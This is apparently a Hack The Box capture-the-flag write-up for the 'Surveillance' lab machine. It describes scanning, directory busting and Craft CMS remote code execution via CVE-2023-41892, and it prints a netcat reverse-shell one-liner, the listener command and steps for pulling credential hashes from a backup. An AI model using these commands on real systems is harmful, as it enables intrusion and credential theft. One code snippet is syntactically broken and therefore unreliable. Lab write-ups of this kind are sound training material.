# Surveillance


<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/6acae25e-f039-4ff6-b160-876222d82942" align="center" alt="keeper-htb" />
</p>



## Introduction :

The Surveillance machine on Hack The Box presented a challenging learning opportunity. The journey involved Nmap scanning, web enumeration, and directory busting to discover an admin login on Craft CMS. Leveraging a Remote Code Execution (RCE) exploit, initial access was gained, leading to the discovery of a user named Matthew. After cracking Matthew's password, SSH access was achieved.

The privilege escalation involved MySQL credentials, "zoneminder" configurations, and a version-specific exploit using Metasploit. Despite challenges, a method to escalate privileges to root was found by manipulating the "user" parameter in zmupdate.pl. The write-up underscores the importance of thorough reconnaissance, exploit analysis, and creative problem-solving in successfully navigating the complexities of the Surveillance machine on HTB.


## Ennumiration :

We start with simple port & services scan and got two standard ports. When we access the web page, it has a specific CMS.

```bash
nmap -p- -T4 -A -sV 10.10.11.245
```

Because HTTP is an open protocol, we can verify whether a webpage can be seen in a web browser.

```bash
sudo echo "10.10.11.245 surveillance" >> /etc/hosts
```
The website appears to be experiencing difficulty locating the site. In such instances, you can resolve the issue by adding the IP and DNS name to the /etc/hosts file.

## Enumerating Directories

Now that we have access to the webpage, let's engage in directory enumeration. In this scenario, we will employ GoBuster.
```bash
gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.4-medium.txt -x .php,.html,.txt,.zip
```

I’ve obtained access to an admin login, and it’s running on Craft CMS.

I examined the source code of surveillance.htb/index.php and determined the version it is running.

Upon researching the version online, I discovered a proof of concept for Remote Code Execution (RCE).

## Exploit :

This Gist provides a Proof-of-Concept (POC) for CVE-2023-41892, a Craft CMS vulnerability that allows Remote Code Execution (RCE).


CVE-2023-41892 is a security vulnerability discovered in Craft CMS, a popular content management system. Craft CMS versions affected by this vulnerability allow attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application.

POC GIST-  https://gist.githubusercontent.com/to016/b796ca3275fa11b5ab9594b1522f7226/raw/4742df53be0584c68d6f7550224948fc6709fea9/CVE-2023-41892-POC.md

You need to edit this part of the script for it to work.

```bash 
response = requests.post(url,  headers=headers, data=data, proxies={"http" : http://127.0.0.1:8080"}} 
```

It should get you a shell.

```bash 
python3 POC.py http://surveillance.htb/
```

After successfully exploit and gaining initial access using the PoC, the subsequent step involves obtaining a secure and robust shell for executing bash commands.

I found the following one-liner:

```bash

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.11.246 4444 >/tmp/f

```

— THE IP AND PORT CAN BE CUSTOMIZED ACCORDING TO USER PREFERENCES.

To elaborate:

The rm command eliminates any pre-existing file at /tmp/f.
The mkfifo command generates a named pipe at /tmp/f.
The cat | /bin/bash pipeline forms an interactive Bash shell linked to the named pipe.
The nc command initiates a network connection, channeling the entire output, including the Bash shell output, back into the named pipe.

This should result in a fully operational shell.
```bash
nc -nvlp 4444
```

During my exploration, I stumbled upon a backup directory nestled within the storage repository.

Subsequently, I proceeded to relocate or duplicate the directory, transitioning it from the storage folder to the hosted web server.

Following this relocation, I initiated a wget command to extract and retrieve the contents of the file, thereby incorporating the backup data into the current environment.

I extracted the contents of the file and examined them to locate specific credentials. Within the extracted data, I identified a user named Matthew along with an encrypted password.

To discern the hashing algorithm employed for Matthew's password, I employed Hash-Identifier. The analysis suggests that the hash might have been generated using SHA-256.


